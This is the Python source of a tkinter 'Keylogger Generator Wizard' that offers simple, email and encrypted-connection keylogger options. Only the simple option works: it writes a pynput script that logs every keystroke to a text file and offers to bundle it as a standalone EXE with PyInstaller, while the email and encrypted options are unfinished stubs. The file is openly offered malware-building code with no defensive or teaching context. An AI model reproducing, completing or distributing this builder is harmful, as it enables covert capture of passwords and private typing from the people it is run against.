import tkinter as tk
from tkinter import messagebox
import subprocess

def on_button_click_email_keylogger():

    tk.Label(root, text="Custom options for email Keylogger").pack(pady=10, padx=10) 

    disable_other_buttons("email")

def on_button_click_encrypted_connection():

    tk.Label(root, text="custom Options for Encrypted Connection Keylogger").pack(pady=10, padx=10) 

    disable_other_buttons("encrypted")

def on_button_click_simple_keylogger():
    tk.Label(root, text="custom options for simple Keylogger").pack(pady=10, padx=10) 

    disable_other_buttons("simple")

    with open('simple-keylogger.py', 'w') as SKeylog:
        SKeylog.write("""from pynput.keyboard import Listener

def writetofile(key):

    keydata = str(key)
    
    with open('keylogfile.txt', 'a') as keylog:

        keylog.write(keydata)

with Listener(on_press=writetofile) as l:
    
    l.join()
""")
        
    convert_to_exe()

def convert_to_exe():

    response = messagebox.askyesno("Convert to EXE", "Do you want to convert the generated Python script to an executable (EXE) file?")

    if response:

        tk.Label(root, text="The script will be converted to an EXE file.").pack(pady=10, padx=10)

        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', 'simple-keylogger.py'])

        tk.Label(root, text="Your script has been converted to an exe file").pack(pady=10, padx=10)

    else:

        tk.Label(root, text="The script will not be converted to an EXE file.").pack(pady=10, padx=10)

def disable_other_buttons(selected_button):
    
    if selected_button != "simple":
        keylogger_button_1.config(state="disabled")
    
    if selected_button != "email":
        keylogger_button_2.config(state="disabled")
    
    if selected_button != "encrypted":
        keylogger_button_3.config(state="disabled")


# Init Tkinter
root = tk.Tk()
root.title("Keylogger Generator Wizard")
root.geometry("520x500")

# --- Keylogger Wizard Widgets --- 

#  Simple Keylogger Widgets
tk.Label(root, text="Keyloggers").pack(pady=5, padx=5)
keylogger_button_1 = tk.Button(root, text="Simple Keylogger", command=on_button_click_simple_keylogger)
keylogger_button_1.pack(pady=20)

#  Email Keylogger Widgets
keylogger_button_2 = tk.Button(root, text="Email Keylogger", command=on_button_click_email_keylogger)
keylogger_button_2.pack(pady=30)

#  Encrypted Keylogger Widgets 
keylogger_button_3 = tk.Button(root, text="Encrypted Connection Keylogger", command=on_button_click_encrypted_connection)
keylogger_button_3.pack(pady=40)

root.mainloop()
